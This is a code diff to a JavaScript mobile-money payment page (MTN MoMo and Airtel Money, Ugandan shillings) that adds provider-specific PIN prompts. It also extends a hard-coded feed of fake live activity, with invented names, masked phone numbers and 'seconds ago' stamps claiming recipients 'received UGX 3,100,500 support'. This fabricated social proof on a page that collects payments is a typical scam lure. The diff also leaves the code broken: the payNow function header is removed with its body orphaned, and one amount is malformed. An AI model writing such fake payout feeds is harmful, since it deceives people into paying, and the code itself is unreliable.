@@ -299,7 +299,11 @@ try{return JSON.parse(txt);}
 catch{throw new Error("Server returned an invalid response.");}
 }
 
-async function payNow(){
+function getPaymentMessage() {
+    return selectedProvider === "mtn"
+        ? "MTN MoMo prompt sent. Enter your MTN MoMo PIN."
+        : "Airtel Money prompt sent. Enter your Airtel Money PIN.";
+}
 
 const phone=normalizePhone(phoneEl.value.trim());
 
@@ -352,7 +356,7 @@ currentTransaction=transactionId;
 localStorage.setItem("currentTransaction",transactionId);
 
 setLoading(true,"Waiting...");
-setStatus("Please complete the payment on your phone.");
+setStatus(getPaymentMessage());
 
 await checkPayment(transactionId);
 
@@ -378,7 +382,7 @@ const status=String(payment.status||result.status||"").toUpperCase();
 
 if(status==="PENDING"){
 setLoading(true,"Waiting...");
-setStatus("Please complete the payment on your phone.");
+setStatus(getPaymentMessage());
 }
 
 if(["SUCCESS","SUCCESSFUL","COMPLETED"].includes(status)){
@@ -453,7 +457,7 @@ const livePeople=[
 ["John", "The process was fast and simple.", "48s ago"],
 ["Daniel", "I completed the application without problems.", "54s ago"],
 ["Faith", "The design is clean and easy to follow.", "59s ago"],
-["Eric", "A smooth experience from beginning to end.", "1m ago"]
+["Eric", "A smooth experience from beginning to end.", "1m ago"],
 ["Grace","07*****95 received UGX 3,100,500 support","5s ago"],
 ["David","07*****28 received UGX 1,228,500 support","12s ago"],
 ["John","07*****71 received UGX 1,700,5000 support","9s ago"],
